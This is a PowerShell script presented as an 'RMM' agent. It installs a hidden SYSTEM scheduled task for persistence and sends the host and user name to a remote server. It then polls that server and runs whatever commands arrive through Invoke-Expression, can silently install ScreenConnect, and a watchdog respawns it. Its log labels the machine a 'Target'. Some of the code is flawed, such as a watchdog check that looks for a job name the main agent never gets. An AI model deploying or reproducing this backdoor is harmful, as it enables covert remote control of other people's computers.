# ============================================================
# CIPHER ANON RMM v3.1 — PERSISTENT FIXED
# ============================================================

$BASE_URL = "{{BASE_URL}}"
$RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
$COMMAND_URL = "$BASE_URL/api/rmm/commands"
$RESPONSE_URL = "$BASE_URL/api/rmm/response"
$SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"

$RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
$RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
$RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
$RMM_POLL_INTERVAL = 15000  # Reduced to 15 seconds for faster reconnection
$RMM_WATCHDOG_INTERVAL = 60000  # 1 minute watchdog

New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $RMM_LOGFILE -Value $line
    Write-Host $line
}

Write-Log "============================================"
Write-Log "CIPHER ANON RMM v3.1 — PERSISTENT"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "============================================"

function Get-RmmClientId {
    if (Test-Path $RMM_CLIENT_ID_FILE) {
        $id = Get-Content $RMM_CLIENT_ID_FILE -Raw
        return $id.Trim()
    }
    $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
    Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id
    return $id
}

function Install-Persistence {
    $taskName = "CipherAnonRMM"
    $scriptPath = $MyInvocation.MyCommand.Path
    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    
    if ($task) {
        Write-Log "Scheduled task already exists"
        # Ensure it's enabled
        try {
            Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            Write-Log "Scheduled task enabled"
        } catch {}
        return
    }
    
    Write-Log "Creating scheduled task: $taskName"
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
        Write-Log "Scheduled task created"
    } catch {
        Write-Log "Failed to create scheduled task: $_"
    }
}

function Execute-Command {
    param($Command)
    Write-Log "Executing: $Command"
    $result = ""
    $success = $true

    if ($Command -like "install-screenconnect*") {
        Write-Log "Downloading ScreenConnect..."
        $installer = "$env:TEMP\sc_installer.msi"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
        } catch {
            $result = "Download failed"
            $success = $false
            return @{ success = $success; result = $result }
        }
        if (Test-Path $installer) {
            Write-Log "Installing ScreenConnect..."
            Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
            Remove-Item $installer -Force -ErrorAction SilentlyContinue
            $result = "ScreenConnect installed"
            try {
                $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                if ($scId) {
                    $result = "ScreenConnect installed — Client ID: $($scId.ClientID)"
                }
            } catch {}
        } else {
            $result = "Failed to download ScreenConnect"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "uninstall-rmm") {
        try {
            Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            $result = "RMM uninstalled"
        } catch {
            $result = "Failed to uninstall: $_"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "whoami") {
        $result = $env:USERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "hostname") {
        $result = $env:COMPUTERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "ping") {
        $result = "pong"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "restart") {
        $result = "Restarting system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    if ($Command -like "shutdown") {
        $result = "Shutting down system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        $result = $output
        $success = $true
    } catch {
        $result = "Unknown command or error: $_"
        $success = $false
    }

    return @{ success = $success; result = $result }
}

function Start-RmmAgent {
    $clientId = Get-RmmClientId
    Write-Log "Client ID: $clientId"
    
    # Ensure persistence is installed
    Install-Persistence

    # Create a separate script block for the main loop
    $mainLoop = {
        param($BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $POLL_INTERVAL, $SCREENCONNECT_URL)
        
        function Write-Log {
            param($Msg)
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            $line = "[$timestamp] $Msg"
            Add-Content -Path $RMM_LOGFILE -Value $line
        }
        
        function Get-ClientId {
            if (Test-Path $RMM_CLIENT_ID_FILE) {
                $id = Get-Content $RMM_CLIENT_ID_FILE -Raw
                return $id.Trim()
            }
            $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
            Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id
            return $id
        }
        
        function Execute-Command {
            param($Command)
            $result = ""
            $success = $true

            if ($Command -like "install-screenconnect*") {
                $installer = "$env:TEMP\sc_installer.msi"
                try {
                    $webClient = New-Object System.Net.WebClient
                    $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
                } catch {
                    $result = "Download failed"
                    $success = $false
                    return @{ success = $success; result = $result }
                }
                if (Test-Path $installer) {
                    Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
                    Remove-Item $installer -Force -ErrorAction SilentlyContinue
                    $result = "ScreenConnect installed"
                    try {
                        $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                        if ($scId) {
                            $result = "ScreenConnect — Client ID: $($scId.ClientID)"
                        }
                    } catch {}
                } else {
                    $result = "Download failed"
                    $success = $false
                }
                return @{ success = $success; result = $result }
            }

            if ($Command -like "uninstall-rmm") {
                try {
                    Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
                    Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
                    $result = "Uninstalled"
                } catch {
                    $result = "Failed: $_"
                    $success = $false
                }
                return @{ success = $success; result = $result }
            }

            if ($Command -like "whoami") {
                $result = $env:USERNAME
                return @{ success = $true; result = $result }
            }

            if ($Command -like "hostname") {
                $result = $env:COMPUTERNAME
                return @{ success = $true; result = $result }
            }

            if ($Command -like "ping") {
                $result = "pong"
                return @{ success = $true; result = $result }
            }

            if ($Command -like "restart") {
                $result = "Restarting..."
                Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
                return @{ success = $true; result = $result }
            }

            if ($Command -like "shutdown") {
                $result = "Shutting down..."
                Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
                return @{ success = $true; result = $result }
            }

            try {
                $output = Invoke-Expression $Command 2>&1 | Out-String
                $result = $output
                $success = $true
            } catch {
                $result = "Error: $_"
                $success = $false
            }

            return @{ success = $success; result = $result }
        }

        $clientId = Get-ClientId
        Write-Log "Agent started (ID: $clientId)"

        # Initial registration
        try {
            $reportData = @{
                clientId = $clientId
                pcName = $env:COMPUTERNAME
                username = $env:USERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                status = "online"
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                rmmInstalled = $true
                rmmType = "CipherAnonRMM"
            }
            $reportJson = $reportData | ConvertTo-Json -Depth 5
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
            $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
            $req.Method = "POST"
            $req.ContentType = "application/json"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 10000
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()
            Write-Log "Initial registration successful"
        } catch {
            Write-Log "Initial registration failed: $_"
        }

        # Main loop
        while ($true) {
            try {
                # Report status
                $reportData = @{
                    clientId = $clientId
                    pcName = $env:COMPUTERNAME
                    username = $env:USERNAME
                    os = (Get-WmiObject Win32_OperatingSystem).Caption
                    status = "online"
                    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                    rmmInstalled = $true
                    rmmType = "CipherAnonRMM"
                }
                $reportJson = $reportData | ConvertTo-Json -Depth 5
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
                
                $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
                $req.Method = "POST"
                $req.ContentType = "application/json"
                $req.ContentLength = $bytes.Length
                $req.Timeout = 10000
                $stream = $req.GetRequestStream()
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Close()
                $resp = $req.GetResponse()
                $resp.Close()

                # Check for commands
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()

                if ($cmdJson) {
                    $cmdData = $cmdJson | ConvertFrom-Json
                    if ($cmdData.command) {
                        Write-Log "Command: $($cmdData.command)"
                        $result = Execute-Command -Command $cmdData.command
                        $responseData = @{
                            clientId = $clientId
                            commandId = $cmdData.id
                            success = $result.success
                            result = $result.result
                            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $respJson = $responseData | ConvertTo-Json -Depth 5
                        $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                        $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                        $respReq.Method = "POST"
                        $respReq.ContentType = "application/json"
                        $respReq.ContentLength = $respBytes.Length
                        $respReq.Timeout = 10000
                        $respStream = $respReq.GetRequestStream()
                        $respStream.Write($respBytes, 0, $respBytes.Length)
                        $respStream.Close()
                        $respResp = $respReq.GetResponse()
                        $respResp.Close()
                    }
                }

            } catch {
                Write-Log "Loop error: $_"
            }
            
            Start-Sleep -Milliseconds $POLL_INTERVAL
        }
    }

    # Start the main loop as a background job with proper parameters
    $job = Start-Job -ScriptBlock $mainLoop -ArgumentList $BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL
    
    if ($job) {
        Write-Log "RMM agent started as background job"
        return $true
    } else {
        Write-Log "Failed to start RMM agent as background job"
        return $false
    }
}

# ---- MAIN EXECUTION ----
$clientId = Get-RmmClientId
Write-Log "Starting RMM agent..."

# Check if we're already running as a job or process
$existingJobs = Get-Job -Name "RMMAgent*" -ErrorAction SilentlyContinue
if ($existingJobs) {
    Write-Log "Existing RMM agent job found, removing old instances..."
    $existingJobs | Stop-Job -PassThru | Remove-Job -Force
    Start-Sleep -Seconds 2
}

# Install persistence
Install-Persistence

# Start the agent
$success = Start-RmmAgent

if ($success) {
    Write-Log ""
    Write-Log "============================================"
    Write-Log "RMM CLIENT READY!"
    Write-Log "Client ID: $clientId"
    Write-Log "Log saved to: $RMM_LOGFILE"
    Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms"
    Write-Log "============================================"
} else {
    Write-Log "FAILED TO START RMM AGENT!"
}

# ---- WATCHDOG (keeps the agent running even if the job dies) ----
# This runs in a separate process to monitor the main job
$watchdogScript = {
    param($BASE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL)
    
    $watchdogPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $clientId = if (Test-Path $RMM_CLIENT_ID_FILE) { (Get-Content $RMM_CLIENT_ID_FILE -Raw).Trim() } else { "unknown" }
    
    while ($true) {
        Start-Sleep -Seconds 30
        
        # Check if the main job is still running
        $jobs = Get-Job -Name "RMMAgent*" -ErrorAction SilentlyContinue
        $running = $false
        foreach ($job in $jobs) {
            if ($job.State -eq 'Running') {
                $running = $true
                break
            }
        }
        
        if (-not $running) {
            # Main job died — restart it
            try {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logLine = "[$timestamp] WATCHDOG: Main job died, restarting..."
                Add-Content -Path $RMM_LOGFILE -Value $logLine
                
                # Clean up dead jobs
                Get-Job -Name "RMMAgent*" | Remove-Job -Force -ErrorAction SilentlyContinue
                
                # Restart the agent
                $scriptBlock = {
                    param($BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $POLL_INTERVAL, $SCREENCONNECT_URL)
                    # Same main loop as above (repeated for watchdog)
                    function Write-Log { param($Msg) $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; $line = "[$timestamp] $Msg"; Add-Content -Path $RMM_LOGFILE -Value $line }
                    function Get-ClientId { if (Test-Path $RMM_CLIENT_ID_FILE) { $id = Get-Content $RMM_CLIENT_ID_FILE -Raw; return $id.Trim() } $id = [System.Guid]::NewGuid().ToString().Substring(0,8); Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id; return $id }
                    function Execute-Command { param($Command) $result="";$success=$true; if($Command -like "install-screenconnect*"){ $installer="$env:TEMP\sc_installer.msi"; try{ $webClient=New-Object System.Net.WebClient; $webClient.DownloadFile($SCREENCONNECT_URL,$installer) } catch { $result="Download failed";$success=$false; return @{success=$success;result=$result} }; if(Test-Path $installer){ Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden; Remove-Item $installer -Force -ErrorAction SilentlyContinue; $result="ScreenConnect installed"; try{ $scId=Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue; if($scId){ $result="ScreenConnect — Client ID: $($scId.ClientID)" } } catch { } } else { $result="Download failed";$success=$false }; return @{success=$success;result=$result} }; if($Command -like "uninstall-rmm"){ try{ Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue; Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue; $result="Uninstalled" } catch { $result="Failed: $_";$success=$false }; return @{success=$success;result=$result} }; if($Command -like "whoami"){ $result=$env:USERNAME; return @{success=$true;result=$result} }; if($Command -like "hostname"){ $result=$env:COMPUTERNAME; return @{success=$true;result=$result} }; if($Command -like "ping"){ $result="pong"; return @{success=$true;result=$result} }; if($Command -like "restart"){ $result="Restarting..."; Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden; return @{success=$true;result=$result} }; if($Command -like "shutdown"){ $result="Shutting down..."; Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden; return @{success=$true;result=$result} }; try{ $output=Invoke-Expression $Command 2>&1 | Out-String; $result=$output; $success=$true } catch { $result="Error: $_";$success=$false }; return @{success=$success;result=$result} }
                    $clientId = Get-ClientId
                    while ($true) {
                        try {
                            $reportData = @{clientId=$clientId;pcName=$env:COMPUTERNAME;username=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption;status="online";timestamp=(Get-Date).ToString("yyyy-MM-dd HH:mm:ss");rmmInstalled=$true;rmmType="CipherAnonRMM"}
                            $reportJson = $reportData | ConvertTo-Json -Depth 5
                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
                            $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
                            $req.Method = "POST"; $req.ContentType = "application/json"; $req.ContentLength = $bytes.Length; $req.Timeout = 10000
                            $stream = $req.GetRequestStream(); $stream.Write($bytes,0,$bytes.Length); $stream.Close(); $resp = $req.GetResponse(); $resp.Close()
                            $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                            $cmdReq.Method = "GET"; $cmdReq.Timeout = 10000
                            $cmdResp = $cmdReq.GetResponse(); $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream()); $cmdJson = $reader.ReadToEnd(); $cmdResp.Close()
                            if ($cmdJson) { $cmdData = $cmdJson | ConvertFrom-Json; if ($cmdData.command) { Write-Log "Command: $($cmdData.command)"; $result = Execute-Command -Command $cmdData.command; $responseData = @{clientId=$clientId;commandId=$cmdData.id;success=$result.success;result=$result.result;timestamp=(Get-Date).ToString("yyyy-MM-dd HH:mm:ss")}; $respJson=$responseData|ConvertTo-Json -Depth 5; $respBytes=[System.Text.Encoding]::UTF8.GetBytes($respJson); $respReq=[System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId"); $respReq.Method="POST"; $respReq.ContentType="application/json"; $respReq.ContentLength=$respBytes.Length; $respReq.Timeout=10000; $respStream=$respReq.GetRequestStream(); $respStream.Write($respBytes,0,$respBytes.Length); $respStream.Close(); $respResp=$respReq.GetResponse(); $respResp.Close() } }
                        } catch { Write-Log "Loop error: $_" }
                        Start-Sleep -Milliseconds $POLL_INTERVAL
                    }
                }
                
                Start-Job -ScriptBlock $scriptBlock -Name "RMMAgent" -ArgumentList $BASE_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL
                
            } catch {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logLine = "[$timestamp] WATCHDOG: Failed to restart: $_"
                Add-Content -Path $RMM_LOGFILE -Value $logLine
            }
        }
    }
}

# Start the watchdog as a separate process (not a job, so it survives)
$watchdogJob = Start-Job -ScriptBlock $watchdogScript -Name "RMMWatchdog" -ArgumentList $BASE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL

if ($watchdogJob) {
    Write-Log "Watchdog started"
} else {
    Write-Log "Watchdog failed to start"
}

Write-Log "============================================"
Write-Log "RMM CLIENT DEPLOYED SUCCESSFULLY!"
Write-Log "Client ID: $clientId"
Write-Log "Log: $RMM_LOGFILE"
Write-Log "============================================"

exit
